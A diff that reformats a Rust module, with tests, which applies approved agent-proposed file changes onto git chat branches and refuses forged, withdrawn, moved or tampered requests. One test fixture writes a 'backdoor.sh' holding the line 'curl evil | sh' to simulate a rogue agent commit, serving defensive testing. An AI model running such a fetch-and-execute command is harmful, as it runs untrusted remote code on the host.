@@ -30,7 +30,9 @@ use std::path::Path;
 use std::sync::Mutex;
 
 use ligus_core::workspace_repo::ApplyRequest;
-use ligus_core::{workspace_config_session_id, ActionProposal, ProposalKind, SessionEvent, Timestamp};
+use ligus_core::{
+    workspace_config_session_id, ActionProposal, ProposalKind, SessionEvent, Timestamp,
+};
 use uuid::Uuid;
 
 use crate::chat_service::{ChatError, ChatService, Result};
@@ -80,7 +82,9 @@ pub fn pending(svc: &ChatService, workspace_id: Uuid) -> Result<Vec<ApplyJob>> {
         if id == config {
             continue;
         }
-        let Ok(Some(s)) = svc.load_in(workspace_id, id) else { continue };
+        let Ok(Some(s)) = svc.load_in(workspace_id, id) else {
+            continue;
+        };
         if s.workspace_id != workspace_id {
             continue;
         }
@@ -92,7 +96,13 @@ pub fn pending(svc: &ChatService, workspace_id: Uuid) -> Result<Vec<ApplyJob>> {
                 continue;
             }
             if let Some(p) = s.proposals.iter().find(|p| p.id == req.proposal_id) {
-                out.push(ApplyJob { chat_id: s.id, workspace_id, request: req.clone(), proposal: p.clone(), founder: founder.clone() });
+                out.push(ApplyJob {
+                    chat_id: s.id,
+                    workspace_id,
+                    request: req.clone(),
+                    proposal: p.clone(),
+                    founder: founder.clone(),
+                });
             }
         }
     }
@@ -109,8 +119,14 @@ pub fn pending(svc: &ChatService, workspace_id: Uuid) -> Result<Vec<ApplyJob>> {
 /// remote and is managed by this host. Anything else applies nowhere (the
 /// request then fails with "no checkout"), never into another repository
 /// or another host's chat branch.
-pub fn checkout_for(svc: &ChatService, job: &ApplyJob, legacy: Option<std::path::PathBuf>) -> Option<std::path::PathBuf> {
-    let Some(repo) = job.proposal.repo_id else { return legacy };
+pub fn checkout_for(
+    svc: &ChatService,
+    job: &ApplyJob,
+    legacy: Option<std::path::PathBuf>,
+) -> Option<std::path::PathBuf> {
+    let Some(repo) = job.proposal.repo_id else {
+        return legacy;
+    };
     // The job's own chat (workspace, chat), never another workspace's log
     // under its id: this is the gate before code is applied.
     let session = svc.load_in(job.workspace_id, job.chat_id).ok().flatten()?;
@@ -118,7 +134,14 @@ pub fn checkout_for(svc: &ChatService, job: &ApplyJob, legacy: Option<std::path:
         return None;
     }
     let roster = svc.workspace_roster(job.workspace_id).ok()?;
-    match crate::repos::turn_checkout(svc.store(), svc.device_id(), "this host", &session, &roster, &crate::repos::cloning()) {
+    match crate::repos::turn_checkout(
+        svc.store(),
+        svc.device_id(),
+        "this host",
+        &session,
+        &roster,
+        &crate::repos::cloning(),
+    ) {
         crate::repos::TurnCheckout::Ready(r) if r.repo.id == repo => Some(r.path),
         _ => None,
     }
@@ -171,11 +194,20 @@ fn pinned<'a>(svc: &'a Mutex<ChatService>, job: &ApplyJob) -> Pinned<'a> {
 
 fn git(dir: &Path, args: &[&str]) -> std::result::Result<String, String> {
     let _lock = crate::git_worktree::lock_if_mutating(dir, args);
-    let out = ligus_core::process_util::git().arg("-C").arg(dir).args(args).output().map_err(|e| format!("git {}: {e}", args[0]))?;
+    let out = ligus_core::process_util::git()
+        .arg("-C")
+        .arg(dir)
+        .args(args)
+        .output()
+        .map_err(|e| format!("git {}: {e}", args[0]))?;
     if out.status.success() {
         Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
     } else {
-        Err(format!("git {}: {}", args[0], String::from_utf8_lossy(&out.stderr).trim()))
+        Err(format!(
+            "git {}: {}",
+            args[0],
+            String::from_utf8_lossy(&out.stderr).trim()
+        ))
     }
 }
 
@@ -192,10 +224,20 @@ fn git_apply(dir: &Path, diff: &str) -> std::result::Result<(), String> {
         .stderr(Stdio::piped())
         .spawn()
         .map_err(|e| format!("git apply: {e}"))?;
-    child.stdin.take().ok_or("git apply: no stdin")?.write_all(diff.as_bytes()).map_err(|e| format!("write patch: {e}"))?;
-    let out = child.wait_with_output().map_err(|e| format!("git apply: {e}"))?;
+    child
+        .stdin
+        .take()
+        .ok_or("git apply: no stdin")?
+        .write_all(diff.as_bytes())
+        .map_err(|e| format!("write patch: {e}"))?;
+    let out = child
+        .wait_with_output()
+        .map_err(|e| format!("git apply: {e}"))?;
     if !out.status.success() {
-        return Err(format!("the change doesn't apply on this host's checkout ({})", String::from_utf8_lossy(&out.stderr).trim()));
+        return Err(format!(
+            "the change doesn't apply on this host's checkout ({})",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
     }
     Ok(())
 }
@@ -205,7 +247,13 @@ fn short(c: &str) -> &str {
 }
 
 /// The `ProposalApplied` this host writes for `job`.
-fn applied_event(job: &ApplyJob, me: Uuid, commit: Option<String>, base: Option<String>, tree: Option<String>) -> SessionEvent {
+fn applied_event(
+    job: &ApplyJob,
+    me: Uuid,
+    commit: Option<String>,
+    base: Option<String>,
+    tree: Option<String>,
+) -> SessionEvent {
     SessionEvent::ProposalApplied {
         proposal_id: job.request.proposal_id,
         diff_digest: job.request.diff_digest.clone(),
@@ -234,7 +282,12 @@ fn fail(svc: &Mutex<ChatService>, job: &ApplyJob, reason: String) -> Result<Outc
 /// the trailer, so [`is_the_change`] decides whether it is the apply.
 fn commit_for(worktree: &Path, request: Uuid) -> Option<String> {
     let grep = format!("--grep={TRAILER}: {request}");
-    git(worktree, &["log", "-1", "--format=%H", "--fixed-strings", &grep]).ok().filter(|c| !c.is_empty())
+    git(
+        worktree,
+        &["log", "-1", "--format=%H", "--fixed-strings", &grep],
+    )
+    .ok()
+    .filter(|c| !c.is_empty())
 }
 
 /// Whether commit `c` is exactly `diff` applied onto its parent (and that
@@ -244,7 +297,10 @@ fn commit_for(worktree: &Path, request: Uuid) -> Option<String> {
 fn is_the_change(worktree: &Path, c: &str, diff: &str, expected_base: Option<&str>) -> bool {
     use std::io::Write;
     use std::process::Stdio;
-    let (Ok(parent), Ok(tree)) = (git(worktree, &["rev-parse", &format!("{c}^")]), git(worktree, &["rev-parse", &format!("{c}^{{tree}}")])) else {
+    let (Ok(parent), Ok(tree)) = (
+        git(worktree, &["rev-parse", &format!("{c}^")]),
+        git(worktree, &["rev-parse", &format!("{c}^{{tree}}")]),
+    ) else {
         return false;
     };
     if expected_base.is_some_and(|b| b != parent) {
@@ -253,14 +309,25 @@ fn is_the_change(worktree: &Path, c: &str, diff: &str, expected_base: Option<&st
     let index = std::env::temp_dir().join(format!("ligus-apply-{}.index", Uuid::new_v4()));
     let run = |args: &[&str], input: Option<&str>| -> Option<String> {
         let mut cmd = ligus_core::process_util::git();
-        cmd.arg("-C").arg(worktree).args(args).env("GIT_INDEX_FILE", &index);
-        cmd.stdin(if input.is_some() { Stdio::piped() } else { Stdio::null() }).stdout(Stdio::piped()).stderr(Stdio::piped());
+        cmd.arg("-C")
+            .arg(worktree)
+            .args(args)
+            .env("GIT_INDEX_FILE", &index);
+        cmd.stdin(if input.is_some() {
+            Stdio::piped()
+        } else {
+            Stdio::null()
+        })
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped());
         let mut child = cmd.spawn().ok()?;
         if let Some(text) = input {
             child.stdin.take()?.write_all(text.as_bytes()).ok()?;
         }
         let out = child.wait_with_output().ok()?;
-        out.status.success().then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
+        out.status
+            .success()
+            .then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
     };
     let made = run(&["read-tree", &parent], None)
         .and_then(|_| run(&["apply", "--cached", "--whitespace=nowarn"], Some(diff)))
@@ -274,16 +341,22 @@ fn is_the_change(worktree: &Path, c: &str, diff: &str, expected_base: Option<&st
 pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> Result<Outcome> {
     let me = pinned(svc, job).device_id();
     if job.request.host_device_id != me {
-        return Err(ChatError::Unauthorized("that apply request is for another host".into()));
+        return Err(ChatError::Unauthorized(
+            "that apply request is for another host".into(),
+        ));
     }
     // A held vote or decision on it: no side effect until it is decided.
     {
         let s = pinned(svc, job);
-        let Some(session) = s.load_in(job.workspace_id, job.chat_id)? else { return Ok(Outcome::Waiting) };
+        let Some(session) = s.load_in(job.workspace_id, job.chat_id)? else {
+            return Ok(Outcome::Waiting);
+        };
         if session.authz.blocks(job.proposal.id, job.proposal.set_id) {
             return Ok(Outcome::Waiting);
         }
-        if session.apply_outcomes.contains_key(&job.request.id) || s.store().apply_attempt_finished(job.request.id)? {
+        if session.apply_outcomes.contains_key(&job.request.id)
+            || s.store().apply_attempt_finished(job.request.id)?
+        {
             return Ok(Outcome::Done);
         }
     }
@@ -291,30 +364,58 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
         .filter(|r| crate::git_worktree::is_git_repo(r))
         .and_then(|r| crate::git_worktree::chat_worktree(r, &job.chat_id.to_string()).ok());
     // Claim it before anything touches the checkout.
-    if !pinned(svc, job).store().claim_apply_attempt(job.request.id)? {
+    if !pinned(svc, job)
+        .store()
+        .claim_apply_attempt(job.request.id)?
+    {
         // An earlier attempt here was interrupted: report what it did.
-        let diff = job.proposal.diff.as_deref().filter(|_| job.proposal.kind == ProposalKind::FileDiff).unwrap_or_default();
-        let expected = job.request.expected_base_commit.as_deref();
-        let found = worktree
+        let diff = job
+            .proposal
+            .diff
             .as_deref()
-            .and_then(|w| commit_for(w, job.request.id).filter(|c| !diff.is_empty() && is_the_change(w, c, diff, expected)));
+            .filter(|_| job.proposal.kind == ProposalKind::FileDiff)
+            .unwrap_or_default();
+        let expected = job.request.expected_base_commit.as_deref();
+        let found = worktree.as_deref().and_then(|w| {
+            commit_for(w, job.request.id)
+                .filter(|c| !diff.is_empty() && is_the_change(w, c, diff, expected))
+        });
         if let Some(c) = found {
             let wt = worktree.as_deref().unwrap_or(Path::new("."));
             let base = git(wt, &["rev-parse", &format!("{c}^")]).ok();
             let tree = git(wt, &["rev-parse", &format!("{c}^{{tree}}")]).ok();
             let mut s = pinned(svc, job);
-            let r = s.fulfil_apply_request(job.chat_id, job.workspace_id, job.request.id, Some(c.clone()), base, tree);
+            let r = s.fulfil_apply_request(
+                job.chat_id,
+                job.workspace_id,
+                job.request.id,
+                Some(c.clone()),
+                base,
+                tree,
+            );
             s.store().finish_apply_attempt(job.request.id)?;
             return match r {
                 Ok(_) => Ok(Outcome::Applied { commit: Some(c) }),
-                Err(e) => Ok(Outcome::Failed { reason: e.to_string() }),
+                Err(e) => Ok(Outcome::Failed {
+                    reason: e.to_string(),
+                }),
             };
         }
-        return fail(svc, job, "this host restarted before it applied the change; ask again".into());
+        return fail(
+            svc,
+            job,
+            "this host restarted before it applied the change; ask again".into(),
+        );
     }
     // Would the fold take it? (Withdrawn meanwhile, no longer approved, a
     // human gate, the base the person saw.)
-    let probe = applied_event(job, me, None, job.request.expected_base_commit.clone(), None);
+    let probe = applied_event(
+        job,
+        me,
+        None,
+        job.request.expected_base_commit.clone(),
+        None,
+    );
     // Bound first: a guard in an `if let` scrutinee would still be held
     // (edition 2021) when `fail` locks again.
     let allowed = pinned(svc, job).would_allow(job.chat_id, job.workspace_id, probe);
@@ -323,7 +424,14 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
     }
     let diff = match (job.proposal.kind, job.proposal.diff.as_deref()) {
         (ProposalKind::FileDiff, Some(d)) => d.to_string(),
-        _ => return fail(svc, job, "this host applies file changes only; implement this proposal from a desktop".into()),
+        _ => {
+            return fail(
+                svc,
+                job,
+                "this host applies file changes only; implement this proposal from a desktop"
+                    .into(),
+            )
+        }
     };
     let Some(wt) = worktree else {
         return fail(svc, job, "this host has no checkout for this chat".into());
@@ -334,7 +442,15 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
     };
     if let Some(expected) = job.request.expected_base_commit.as_deref() {
         if expected != base {
-            return fail(svc, job, format!("the checkout moved since the request (expected {}, at {})", short(expected), short(&base)));
+            return fail(
+                svc,
+                job,
+                format!(
+                    "the checkout moved since the request (expected {}, at {})",
+                    short(expected),
+                    short(&base)
+                ),
+            );
         }
     }
     // Only the approved change goes into the commit: anything an agent turn
@@ -342,23 +458,56 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
     // request (`git add -A`).
     match git(&wt, &["status", "--porcelain", "--untracked-files=all"]) {
         Ok(st) if st.is_empty() => {}
-        Ok(_) => return fail(svc, job, "the checkout has uncommitted changes; commit or discard them, then ask again".into()),
+        Ok(_) => {
+            return fail(
+                svc,
+                job,
+                "the checkout has uncommitted changes; commit or discard them, then ask again"
+                    .into(),
+            )
+        }
         Err(e) => return fail(svc, job, e),
     }
     // The patch lands in a scratch index (or a scratch worktree, three-way)
     // and the chat branch moves by compare-and-swap from the base the
     // person saw: a conflict leaves the branch and the worktree untouched.
-    let message = crate::repos::apply::apply_message(&job.proposal.title, job.proposal.id, &[(TRAILER, job.request.id.to_string())]);
-    let Some(root) = repo else { return fail(svc, job, "this host has no checkout for this chat".into()) };
-    let applied = match crate::repos::apply::apply_to_chat_branch(root, &job.chat_id.to_string(), &diff, &message, false, Some(&base)) {
+    let message = crate::repos::apply::apply_message(
+        &job.proposal.title,
+        job.proposal.id,
+        &[(TRAILER, job.request.id.to_string())],
+    );
+    let Some(root) = repo else {
+        return fail(svc, job, "this host has no checkout for this chat".into());
+    };
+    let applied = match crate::repos::apply::apply_to_chat_branch(
+        root,
+        &job.chat_id.to_string(),
+        &diff,
+        &message,
+        false,
+        Some(&base),
+    ) {
         Ok(a) => a,
-        Err(crate::repos::apply::ApplyError::Moved) => return fail(svc, job, "the checkout moved while applying; ask again".into()),
+        Err(crate::repos::apply::ApplyError::Moved) => {
+            return fail(
+                svc,
+                job,
+                "the checkout moved while applying; ask again".into(),
+            )
+        }
         Err(e) => return fail(svc, job, e.to_string()),
     };
     let commit = Some(applied.commit.clone());
     let tree = Some(applied.tree.clone());
     let mut s = pinned(svc, job);
-    let written = s.fulfil_apply_request(job.chat_id, job.workspace_id, job.request.id, commit.clone(), Some(base.clone()), tree);
+    let written = s.fulfil_apply_request(
+        job.chat_id,
+        job.workspace_id,
+        job.request.id,
+        commit.clone(),
+        Some(base.clone()),
+        tree,
+    );
     s.store().finish_apply_attempt(job.request.id)?;
     drop(s);
     match written {
@@ -366,10 +515,15 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
         Err(e) => {
             // The fold refused it after all (withdrawn in between): take the
             // commit back, so this host didn't apply what nobody asked for.
-            if commit.as_deref().is_some_and(|c| git(&wt, &["rev-parse", "HEAD"]).ok().as_deref() == Some(c)) {
+            if commit
+                .as_deref()
+                .is_some_and(|c| git(&wt, &["rev-parse", "HEAD"]).ok().as_deref() == Some(c))
+            {
                 let _ = git(&wt, &["reset", "--hard", &base]);
             }
-            Ok(Outcome::Failed { reason: e.to_string() })
+            Ok(Outcome::Failed {
+                reason: e.to_string(),
+            })
         }
     }
 }
@@ -378,8 +532,8 @@ pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> 
 mod tests {
     use super::*;
     use crate::EventStore;
-    use ligus_core::{ActorIdentity, ActorKind, ProposalStatus, SigningKeypair};
     use ligus_core::workspace_repo::ApplyOutcome;
+    use ligus_core::{ActorIdentity, ActorKind, ProposalStatus, SigningKeypair};
 
     const DIFF: &str = "diff --git a/new.txt b/new.txt\nnew file mode 100644\n--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1 @@\n+hello\n";
 
@@ -394,7 +548,9 @@ mod tests {
     }
 
     /// [`setup`] with the store `open(tmp)` makes.
-    fn setup_in(open: impl FnOnce(&Path) -> EventStore) -> (Mutex<ChatService>, Uuid, Uuid, ApplyJob, tempfile::TempDir) {
+    fn setup_in(
+        open: impl FnOnce(&Path) -> EventStore,
+    ) -> (Mutex<ChatService>, Uuid, Uuid, ApplyJob, tempfile::TempDir) {
         let tmp = tempfile::tempdir().unwrap();
         let store = open(tmp.path());
         let repo = tmp.path().join("repo");
@@ -408,23 +564,33 @@ mod tests {
         let account = Uuid::new_v4();
         let mut author = ActorIdentity::new(account.to_string(), "Ana", ActorKind::Human);
         author.account_id = Some(account);
-        let mut svc = ChatService::new(store, SigningKeypair::generate().unwrap(), SigningKeypair::generate().unwrap(), author);
+        let mut svc = ChatService::new(
+            store,
+            SigningKeypair::generate().unwrap(),
+            SigningKeypair::generate().unwrap(),
+            author,
+        );
         svc.enable_test_presence();
         // Pinned to its own founding, as a host pins a workspace's founder.
         svc.set_trusted_founder(Some(account.to_string()));
         let wid = Uuid::new_v4();
         svc.ensure_workspace_config(wid).unwrap();
         let chat = svc.create_chat("c", wid, "anthropic").unwrap();
-        let mut p = ActionProposal::file_diff("Add new.txt", "agent", DIFF.into(), vec!["new.txt".into()]);
+        let mut p =
+            ActionProposal::file_diff("Add new.txt", "agent", DIFF.into(), vec!["new.txt".into()]);
         p.created_at = Timestamp::epoch();
         let pid = p.id;
         svc.upsert_proposal(chat.id, wid, p).unwrap();
-        let r = svc.vote_on_proposal(chat.id, wid, pid, true).unwrap().unwrap();
+        let r = svc
+            .vote_on_proposal(chat.id, wid, pid, true)
+            .unwrap()
+            .unwrap();
         assert_eq!(r.status, ProposalStatus::Approved);
         let wt = crate::git_worktree::chat_worktree(&repo, &chat.id.to_string()).unwrap();
         let head = sh(&wt, &["rev-parse", "HEAD"]);
         let me = svc.device_id();
-        svc.request_apply(chat.id, wid, pid, me, Some(head)).unwrap();
+        svc.request_apply(chat.id, wid, pid, me, Some(head))
+            .unwrap();
         let jobs = pending(&svc, wid).unwrap();
         assert_eq!(jobs.len(), 1);
         let job = jobs[0].clone();
@@ -432,7 +598,13 @@ mod tests {
     }
 
     fn outcome(svc: &Mutex<ChatService>, chat: Uuid, job: &ApplyJob) -> Option<ApplyOutcome> {
-        lock(svc).load(chat).unwrap().unwrap().apply_outcomes.get(&job.request.id).cloned()
+        lock(svc)
+            .load(chat)
+            .unwrap()
+            .unwrap()
+            .apply_outcomes
+            .get(&job.request.id)
+            .cloned()
     }
 
     /// The host applying a person's request for a repo proposal passes the
@@ -445,26 +617,89 @@ mod tests {
         let path = tmp.path().join("wefit");
         std::fs::create_dir_all(&path).unwrap();
         sh(&path, &["init", "-q", "-b", "main"]);
-        sh(&path, &["-c", "user.email=t@e", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "init"]);
-        sh(&path, &["remote", "add", "origin", "https://github.com/zazulam/wefit.git"]);
+        sh(
+            &path,
+            &[
+                "-c",
+                "user.email=t@e",
+                "-c",
+                "user.name=t",
+                "commit",
+                "-q",
+                "--allow-empty",
+                "-m",
+                "init",
+            ],
+        );
+        sh(
+            &path,
+            &[
+                "remote",
+                "add",
+                "origin",
+                "https://github.com/zazulam/wefit.git",
+            ],
+        );
         let repo = {
             let mut s = lock(&svc);
-            let repo = s.add_workspace_repo(wid, "github.com/zazulam/wefit", "WeFit", "github", "main", None).unwrap();
+            let repo = s
+                .add_workspace_repo(
+                    wid,
+                    "github.com/zazulam/wefit",
+                    "WeFit",
+                    "github",
+                    "main",
+                    None,
+                )
+                .unwrap();
             s.set_chat_repo(chat, wid, Some(repo.id), "").unwrap();
             let me = s.device_id();
-            crate::repos::bind(s.store(), me, "h", wid, &repo, &path, crate::event_store::CheckoutSource::Bound).unwrap();
+            crate::repos::bind(
+                s.store(),
+                me,
+                "h",
+                wid,
+                &repo,
+                &path,
+                crate::event_store::CheckoutSource::Bound,
+            )
+            .unwrap();
             repo
         };
         job.proposal.repo_id = Some(repo.id);
         let canon = crate::repos::git::canonical(&path);
         assert_eq!(checkout_for(&lock(&svc), &job, None), Some(canon.clone()));
         // origin re-pointed: no longer WeFit.
-        sh(&path, &["remote", "set-url", "origin", "https://github.com/evil/other.git"]);
-        assert_eq!(checkout_for(&lock(&svc), &job, None), None, "remote_mismatch");
-        sh(&path, &["remote", "set-url", "origin", "https://github.com/zazulam/wefit.git"]);
+        sh(
+            &path,
+            &[
+                "remote",
+                "set-url",
+                "origin",
+                "https://github.com/evil/other.git",
+            ],
+        );
+        assert_eq!(
+            checkout_for(&lock(&svc), &job, None),
+            None,
+            "remote_mismatch"
+        );
+        sh(
+            &path,
+            &[
+                "remote",
+                "set-url",
+                "origin",
+                "https://github.com/zazulam/wefit.git",
+            ],
+        );
         // Another host on this machine took the checkout over.
         crate::repos::marker::take_over(&path, Uuid::new_v4(), "box").unwrap();
-        assert_eq!(checkout_for(&lock(&svc), &job, None), None, "managed elsewhere");
+        assert_eq!(
+            checkout_for(&lock(&svc), &job, None),
+            None,
+            "managed elsewhere"
+        );
     }
 
     /// Another workspace's chat under the same id (anyone who knows it can
@@ -479,7 +714,14 @@ mod tests {
             let mut s = lock(&svc);
             let mut forged = ligus_core::ChatSession::new("evil", w2, "anthropic");
             forged.id = chat;
-            let mut env = ligus_core::SessionEventEnvelope::new(chat, w2, 1, ligus_core::SessionEvent::SessionSnapshot { session: Box::new(forged) });
+            let mut env = ligus_core::SessionEventEnvelope::new(
+                chat,
+                w2,
+                1,
+                ligus_core::SessionEvent::SessionSnapshot {
+                    session: Box::new(forged),
+                },
+            );
             env.event_id = Uuid::nil();
             env.lamport = 1;
             env.actor_stamp = Some(ligus_core::ActorStamp {
@@ -492,25 +734,49 @@ mod tests {
                 sig_alg: Default::default(),
                 log_head: None,
             });
-            ligus_core::sign_envelope(&mut env, Uuid::new_v4(), &SigningKeypair::generate().unwrap());
+            ligus_core::sign_envelope(
+                &mut env,
+                Uuid::new_v4(),
+                &SigningKeypair::generate().unwrap(),
+            );
             s.store_mut().ingest(&env).unwrap();
             s.set_context_workspace(Some(w2));
-            assert!(s.load_resolving(chat).unwrap().is_none_or(|c| c.workspace_id == w2), "the context reads W2's chat");
+            assert!(
+                s.load_resolving(chat)
+                    .unwrap()
+                    .is_none_or(|c| c.workspace_id == w2),
+                "the context reads W2's chat"
+            );
             let jobs = pending(&s, wid).unwrap();
             assert_eq!(jobs.len(), 1, "A's request is still listed");
             assert_eq!(jobs[0].request.id, job.request.id);
-            assert_eq!(checkout_for(&s, &job, Some(tmp.path().join("legacy"))), Some(tmp.path().join("legacy")));
+            assert_eq!(
+                checkout_for(&s, &job, Some(tmp.path().join("legacy"))),
+                Some(tmp.path().join("legacy"))
+            );
             // A phone of this person drafts a post in A's chat.
             let phone = ligus_core::testkit::Phone::new();
             let phone_id = phone.device_id;
             s.certify_phone(wid, phone_id, &phone.public_key()).unwrap();
-            let (draft, _) = s.draft_phone_action(wid, phone_id, &ligus_core::phone_action::PhoneAction::Post { chat_id: chat, text: "from the phone".into() }).unwrap();
+            let (draft, _) = s
+                .draft_phone_action(
+                    wid,
+                    phone_id,
+                    &ligus_core::phone_action::PhoneAction::Post {
+                        chat_id: chat,
+                        text: "from the phone".into(),
+                    },
+                )
+                .unwrap();
             assert_eq!((draft.env.workspace_id, draft.env.session_id), (wid, chat));
         }
         let repo = tmp.path().join("repo");
         let r = fulfil(&svc, &job, Some(&repo)).unwrap();
         assert!(matches!(r, Outcome::Applied { commit: Some(_) }), "{r:?}");
-        assert_eq!(lock(&svc).load_in(wid, chat).unwrap().unwrap().proposals[0].status, ProposalStatus::Applied);
+        assert_eq!(
+            lock(&svc).load_in(wid, chat).unwrap().unwrap().proposals[0].status,
+            ProposalStatus::Applied
+        );
     }
 
     #[test]
@@ -518,12 +784,24 @@ mod tests {
         let (svc, chat, wid, job, tmp) = setup();
         let repo = tmp.path().join("repo");
         let r = fulfil(&svc, &job, Some(&repo)).unwrap();
-        let Outcome::Applied { commit: Some(c) } = r else { panic!("{r:?}") };
+        let Outcome::Applied { commit: Some(c) } = r else {
+            panic!("{r:?}")
+        };
         let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
         // Windows checkouts may use CRLF (core.autocrlf); the committed blob is what counts.
-        assert_eq!(std::fs::read_to_string(wt.join("new.txt")).unwrap().replace("\r\n", "\n"), "hello\n");
+        assert_eq!(
+            std::fs::read_to_string(wt.join("new.txt"))
+                .unwrap()
+                .replace("\r\n", "\n"),
+            "hello\n"
+        );
         assert_eq!(commit_for(&wt, job.request.id).as_deref(), Some(c.as_str()));
-        assert_eq!(outcome(&svc, chat, &job), Some(ApplyOutcome::Applied { commit: Some(c.clone()) }));
+        assert_eq!(
+            outcome(&svc, chat, &job),
+            Some(ApplyOutcome::Applied {
+                commit: Some(c.clone())
+            })
+        );
         let s = lock(&svc).load(chat).unwrap().unwrap();
         assert_eq!(s.proposals[0].status, ProposalStatus::Applied);
         // Nothing left to do, and a second call doesn't apply again.
@@ -541,10 +819,16 @@ mod tests {
         sh(&wt, &["commit", "-qam", "moved"]);
         let moved = sh(&wt, &["rev-parse", "HEAD"]);
         let r = fulfil(&svc, &job, Some(&repo)).unwrap();
-        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("checkout moved")), "{r:?}");
+        assert!(
+            matches!(&r, Outcome::Failed { reason } if reason.contains("checkout moved")),
+            "{r:?}"
+        );
         assert_eq!(sh(&wt, &["rev-parse", "HEAD"]), moved);
         assert!(!wt.join("new.txt").exists());
-        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
+        assert!(matches!(
+            outcome(&svc, chat, &job),
+            Some(ApplyOutcome::Failed { .. })
+        ));
         // The proposal stays approved: a person may ask again.
         let s = lock(&svc).load(chat).unwrap().unwrap();
         assert_eq!(s.proposals[0].status, ProposalStatus::Approved);
@@ -555,17 +839,29 @@ mod tests {
     fn a_host_without_a_checkout_says_so() {
         let (svc, chat, _, job, _tmp) = setup();
         let r = fulfil(&svc, &job, None).unwrap();
-        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("no checkout")), "{r:?}");
-        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
+        assert!(
+            matches!(&r, Outcome::Failed { reason } if reason.contains("no checkout")),
+            "{r:?}"
+        );
+        assert!(matches!(
+            outcome(&svc, chat, &job),
+            Some(ApplyOutcome::Failed { .. })
+        ));
     }
 
     #[test]
     fn a_withdrawn_request_is_never_applied() {
         let (svc, chat, wid, job, tmp) = setup();
-        lock(&svc).withdraw_apply_request(chat, wid, job.request.id).unwrap();
+        lock(&svc)
+            .withdraw_apply_request(chat, wid, job.request.id)
+            .unwrap();
         assert!(pending(&lock(&svc), wid).unwrap().is_empty());
-        assert_eq!(fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap(), Outcome::Done);
-        let wt = crate::git_worktree::chat_worktree(&tmp.path().join("repo"), &chat.to_string()).unwrap();
+        assert_eq!(
+            fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap(),
+            Outcome::Done
+        );
+        let wt = crate::git_worktree::chat_worktree(&tmp.path().join("repo"), &chat.to_string())
+            .unwrap();
         assert!(!wt.join("new.txt").exists());
     }
 
@@ -575,15 +871,38 @@ mod tests {
         let repo = tmp.path().join("repo");
         let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
         // The earlier run claimed it and committed, then died.
-        assert!(lock(&svc).store().claim_apply_attempt(job.request.id).unwrap());
+        assert!(lock(&svc)
+            .store()
+            .claim_apply_attempt(job.request.id)
+            .unwrap());
         git_apply(&wt, DIFF).unwrap();
         sh(&wt, &["add", "-A"]);
-        sh(&wt, &["commit", "-q", "-m", &format!("Apply proposal: x\n\n{TRAILER}: {}\n", job.request.id)]);
+        sh(
+            &wt,
+            &[
+                "commit",
+                "-q",
+                "-m",
+                &format!("Apply proposal: x\n\n{TRAILER}: {}\n", job.request.id),
+            ],
+        );
         let c = sh(&wt, &["rev-parse", "HEAD"]);
         let r = fulfil(&svc, &job, Some(&repo)).unwrap();
-        assert_eq!(r, Outcome::Applied { commit: Some(c.clone()) });
-        assert_eq!(sh(&wt, &["rev-list", "--count", "HEAD"]), "2", "applied once");
-        assert_eq!(outcome(&svc, chat, &job), Some(ApplyOutcome::Applied { commit: Some(c) }));
+        assert_eq!(
+            r,
+            Outcome::Applied {
+                commit: Some(c.clone())
+            }
+        );
+        assert_eq!(
+            sh(&wt, &["rev-list", "--count", "HEAD"]),
+            "2",
+            "applied once"
+        );
+        assert_eq!(
+            outcome(&svc, chat, &job),
+            Some(ApplyOutcome::Applied { commit: Some(c) })
+        );
     }
 
     /// An agent turn's uncommitted work in the chat's worktree never rides
@@ -601,9 +920,15 @@ mod tests {
             let files = sh(&wt, &["show", "--name-only", "--format=", c]);
             panic!("applied with {files:?}");
         }
-        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("uncommitted")), "{r:?}");
+        assert!(
+            matches!(&r, Outcome::Failed { reason } if reason.contains("uncommitted")),
+            "{r:?}"
+        );
         // The agent's work is left as it was.
-        assert_eq!(std::fs::read_to_string(wt.join("README.md")).unwrap(), "tampered\n");
+        assert_eq!(
+            std::fs::read_to_string(wt.join("README.md")).unwrap(),
+            "tampered\n"
+        );
         assert!(wt.join("backdoor.sh").exists());
     }
 
@@ -617,14 +942,28 @@ mod tests {
         let repo = tmp.path().join("repo");
         let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
         // The earlier run claimed it and died before its commit ...
-        assert!(lock(&svc).store().claim_apply_attempt(job.request.id).unwrap());
+        assert!(lock(&svc)
+            .store()
+            .claim_apply_attempt(job.request.id)
+            .unwrap());
         // ... and an agent committed something else under the trailer.
         std::fs::write(wt.join("backdoor.sh"), "curl evil | sh\n").unwrap();
         sh(&wt, &["add", "-A"]);
-        sh(&wt, &["commit", "-q", "-m", &format!("looks legit\n\n{TRAILER}: {}\n", job.request.id)]);
+        sh(
+            &wt,
+            &[
+                "commit",
+                "-q",
+                "-m",
+                &format!("looks legit\n\n{TRAILER}: {}\n", job.request.id),
+            ],
+        );
